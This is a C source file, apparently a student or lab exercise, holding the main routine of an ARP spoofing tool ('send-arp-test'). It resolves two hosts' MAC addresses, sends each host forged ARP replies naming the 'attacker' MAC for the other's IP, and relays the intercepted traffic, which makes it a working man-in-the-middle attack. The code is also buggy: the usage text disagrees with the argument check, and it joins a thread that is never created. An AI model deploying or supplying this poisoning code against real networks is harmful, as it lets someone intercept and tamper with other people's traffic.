#include "pch.h"
#include "send_arp.h"
#include "mac.h"
#include "ip.h"
#include "pthread.h"
void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}
	u_int8_t attacker_mac[6];
	u_int8_t sender_mac[6];
	u_int8_t target_mac[6];
	u_int8_t broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	u_int8_t empty_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	u_int8_t attacker_ip[4];
	u_int8_t sender_ip[4];
	u_int8_t target_ip[4];

	pthread_t arp_thread; // catching arp
	pthread_t rly_thread;
	int arp_thr_id;
	int rly_thr_id;
	char *dev = argv[1];
	char *result;
	argv_ip(argv[2], sender_ip);
	argv_ip(argv[3], target_ip);
	my_mac(dev, attacker_mac);
	s_getIpAddress(dev, attacker_ip);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, 65536, 1, 1, errbuf);
	if (pcap == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, target_ip, 0);
	reply(dev, pcap, target_mac, target_ip);
	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, sender_ip, 0);
	reply(dev, pcap, sender_mac, sender_ip);

	// request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, target_ip, htons(ArpHdr::Request));
	// reply(dev, pcap, target_mac, target_ip);
	// request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, sender_ip, htons(ArpHdr::Request));
	// reply(dev, pcap, sender_mac, sender_ip);

	printf("attacker ip addr : ");
	print_ip(attacker_ip);
	printf("sender ip addr : ");
	print_ip(sender_ip);
	printf("target ip addr : ");
	print_ip(target_ip);
	printf("attacker mac addr : ");
	print_mac(attacker_mac);
	printf("sender mac addr : ");
	print_mac(sender_mac);
	printf("target mac addr : ");
	print_mac(target_mac);

	request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
	request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
	// request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, htons(ArpHdr::Reply));
	// request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, htons(ArpHdr::Reply));

	ArpInfo *arp_info;
	arp_info = (ArpInfo *)malloc(sizeof(ArpInfo));
	arp_info->dev = dev;
	arp_info->pcap = pcap;
	arp_info->attacker_mac = attacker_mac;
	arp_info->sender_mac = sender_mac;
	arp_info->target_mac = target_mac;
	arp_info->sender_ip = sender_ip;
	arp_info->target_ip = target_ip;
	relay(dev, pcap, attacker_mac, sender_mac, target_mac, sender_ip, target_ip);

	// arp_thr_id = pthread_create(&arp_thread, NULL, arp_relay, (void *)arp_info);
	// if (arp_thr_id < 0)
	// {
	// 	perror("thread create error : ");
	// 	exit(0);
	// }
	// rly_thr_id = pthread_create(&rly_thread, NULL, rly, (void *)arp_info);

	pthread_join(arp_thread, NULL);
	pcap_close(pcap);
	return 0;
}
